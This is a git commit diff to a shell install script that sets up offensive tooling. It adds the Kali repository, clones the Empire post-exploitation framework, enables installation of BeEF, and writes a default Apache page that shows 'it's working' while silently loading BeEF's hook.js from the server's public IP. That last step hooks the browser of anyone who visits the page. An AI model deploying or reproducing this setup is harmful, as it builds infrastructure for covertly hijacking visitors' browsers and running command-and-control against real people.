f248c6118388501da6299565facd21e5e09eb5d9
Ahmed Saeed <ahmedsaeedramadan@yahoo.com>
2021-03-25 00:08:53 +0200

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,8 +1,8 @@
 apt update && sudo apt upgrade -y
 apt install git curl gnupg -y
-#echo 'deb https://http.kali.org/kali kali-rolling main non-free contrib' > /etc/apt/sources.list.d/kali.list
-#wget 'https://archive.kali.org/archive-key.asc'
-#sudo apt-key add archive-key.asc
+echo 'deb https://http.kali.org/kali kali-rolling main non-free contrib' > /etc/apt/sources.list.d/kali.list
+wget 'https://archive.kali.org/archive-key.asc'
+sudo apt-key add archive-key.asc
 cd /opt
 git clone https://github.com/BC-SECURITY/Empire.git
 cd /opt/Empire/setup/
@@ -11,7 +11,7 @@ echo "cd /opt/Empire;python3 empire" > /usr/bin/empire
 chmod +x /usr/bin/empire
 apt install xfce4 xfce4-goodies -y
 apt install tightvncserver -y
-#apt install beef-xss -y
+apt install beef-xss -y
 apt install apache2 -y 
 mv /var/www/html/index.html /var/www/html/index.html.bak
 echo "it's working<script src=\"http://"$(host myip.opendns.com resolver1.opendns.com | grep "myip.opendns.com has" | awk '{print $4}')":3000/hook.js\"></script>" >> /var/www/html/index.html
